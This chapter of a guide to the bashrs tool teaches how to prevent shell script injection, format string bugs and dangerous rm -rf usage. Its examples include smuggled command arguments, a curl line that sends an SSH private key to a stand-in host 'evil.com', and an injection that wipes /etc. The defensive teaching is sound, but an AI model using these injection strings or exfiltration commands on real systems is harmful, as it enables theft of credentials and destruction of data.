# Chapter 10: Security and Injection Prevention

Shell scripts are the glue of production infrastructure, yet they're among the most vulnerable to security exploits. A single unquoted variable or format string injection can escalate into complete system compromise. This chapter covers how bashrs helps prevent common shell security vulnerabilities.

## Why Shell Security Matters

**Real-world incident**: A production deployment script with an unquoted variable allowed an attacker to inject commands, leading to data exfiltration.

```bash
# VULNERABLE CODE (production script)
FILENAME=$1  # User input
rm /tmp/$FILENAME  # ❌ Command injection!
```

**Attack**:
```bash
$ ./cleanup.sh "test.txt; cat /etc/passwd > /tmp/stolen"
# Executes: rm /tmp/test.txt; cat /etc/passwd > /tmp/stolen
```

### Common Shell Vulnerabilities

1. **Command Injection**: Unquoted variables allowing arbitrary command execution
2. **Format String Injection**: Variables in printf format strings
3. **Path Traversal**: Unvalidated file paths accessing sensitive files
4. **Dangerous Operations**: Unprotected rm -rf / chmod 777
5. **Information Disclosure**: Secrets in scripts or logs

## How Bashrs Prevents Security Issues

Bashrs provides **defense in depth** through multiple layers:

1. **Static Analysis**: Linter catches dangerous patterns before execution
2. **Automatic Quoting**: Transpiler adds quotes where needed
3. **Type Safety**: Rust's type system prevents many injection classes
4. **Validation**: AST validates all constructs before generation

---

## Command Injection Prevention

### The Attack Surface

Command injection occurs when untrusted input is used in shell commands without proper quoting:

```bash
# VULNERABLE: Unquoted user input
USER_FILE=$1
cat $USER_FILE  # ❌ Injection point!
```

**Exploitation**:
```bash
$ ./view.sh "/etc/passwd; curl evil.com/exfiltrate?data=$(cat ~/.ssh/id_rsa)"
# Executes BOTH commands!
```

### SC2086: The Most Critical Rule

**Rule**: Double quote to prevent globbing and word splitting

**Example Vulnerability**:
```bash
#!/bin/bash
# cleanup.sh - DANGEROUS
TARGET_DIR=$1
rm -rf $TARGET_DIR/*  # ❌ CRITICAL VULNERABILITY
```

**Attack**:
```bash
$ ./cleanup.sh "/tmp/test /etc"
# Expands to: rm -rf /tmp/test /etc/*
# DELETES /etc CONTENTS!
```

### Bashrs Protection

**Rust Version** (Type-Safe):
```rust
// cleanup.rs - SAFE
fn cleanup(target_dir: &str) -> Result<(), String> {
    // Rust's type system prevents many injection classes
    let target_path = Path::new(target_dir);

    // Validate path before use
    if !target_path.starts_with("/tmp/") {
        return Err("Invalid path: must be in /tmp/".to_string());
    }

    std::fs::remove_dir_all(target_path)
        .map_err(|e| format!("Failed to remove: {}", e))
}
```

**Generated Shell** (Quoted):
```sh
#!/bin/sh
# Generated by bashrs - ALL VARIABLES QUOTED

cleanup() {
    target_dir="$1"

    # ✅ Properly quoted - safe from injection
    rm -rf "${target_dir:?}/"  # :? fails if unset
}
```

### Quoting Rules

| Pattern | Vulnerable | Safe | Detection |
|---------|-----------|------|-----------|
| `rm $file` | ❌ | `rm "$file"` | SC2086 |
| `cat $1 $2` | ❌ | `cat "$1" "$2"` | SC2086 |
| `cd $DIR` | ❌ | `cd "$DIR"` | SC2086 |
| `$(cmd $var)` | ❌ | `"$(cmd "$var")"` | SC2046 |

---

## Format String Injection (SC2059)

### The Vulnerability

Using variables in printf format strings allows format string injection:

```bash
# VULNERABLE: Variable as format string
MESSAGE=$1
printf "$MESSAGE"  # ❌ Format string injection!
```

**Attack**:
```bash
$ ./log.sh "%s%s%s%s%s%s%s%s%s%s"
# Crashes or leaks memory contents
```

### The Fix

Always use literal format strings with %s for variables:

```bash
# SAFE: Literal format string
MESSAGE=$1
printf '%s\n' "$MESSAGE"  # ✅ Safe!
```

### Bashrs Protection

```rust
// Rust version - type safe
fn log_message(msg: &str) {
    println!("{}", msg);  // Safe - no format string vuln
}
```

Generates:
```sh
log_message() {
    printf '%s\n' "$1"  # ✅ Always literal format
}
```

---

## Dangerous Operations

### SC2115: Protect Against rm -rf /

**Vulnerability**:
```bash
PROJECT_DIR=""  # Oops, unset!
rm -rf "$PROJECT_DIR/"  # Becomes: rm -rf /
# DELETES ENTIRE SYSTEM!
```

**Protection**:
```bash
# Use :? to fail if unset
rm -rf "${PROJECT_DIR:?}/"  # ✅ Exits with error if unset
```

### SC2164: Always Check cd

**Vulnerability**:
```bash
cd "$PROJECT_DIR"
rm -rf *  # If cd failed, runs in wrong directory!
```

**Protection**:
```bash
cd "$PROJECT_DIR" || exit 1  # ✅ Exit if cd fails
rm -rf *  # Only runs if cd succeeded
```

## Security Best Practices

### 1. Input Validation

```rust
fn validate_filename(name: &str) -> Result<(), String> {
    // Allow only alphanumeric, dash, underscore
    if !name.chars().all(|c| c.is_alphanumeric() || c == '-' || c == '_') {
        return Err("Invalid filename".to_string());
    }
    Ok(())
}
```

### 2. Path Restrictions

```rust
fn validate_path(path: &Path) -> Result<(), String> {
    // Must be within allowed directory
    if !path.starts_with("/tmp/app/") {
        return Err("Path outside allowed directory".to_string());
    }
    Ok(())
}
```

### 3. Least Privilege

```bash
# Set restrictive permissions
chmod 750 /app/config  # rwxr-x---, not 777
```

### 4. No Secrets in Scripts

```rust
// ❌ NEVER hardcode secrets
const API_KEY: &str = "secret123";  // VULNERABLE!

// ✅ Use environment variables
fn get_api_key() -> Result<String, String> {
    std::env::var("API_KEY")
        .map_err(|_| "API_KEY not set".to_string())
}
```

## Summary

**Security Layers in Bashrs**:

| Layer | Protection | Rules |
|-------|------------|-------|
| **Linting** | Static analysis | SC2086, SC2046, SC2059, SC2115, SC2164 |
| **Quoting** | Auto-quote variables | All variables quoted in output |
| **Type Safety** | Rust types | Prevents many injection classes |
| **Validation** | Path/input checks | Whitelist allowed patterns |

**Key Takeaways**:
1. **Always quote variables** - SC2086 is the #1 security rule
2. **Use literal format strings** - Never `printf "$var"`
3. **Validate all input** - Whitelist, don't blacklist
4. **Check command failures** - `cd ... || exit`
5. **Protect dangerous operations** - `${VAR:?}` for required variables
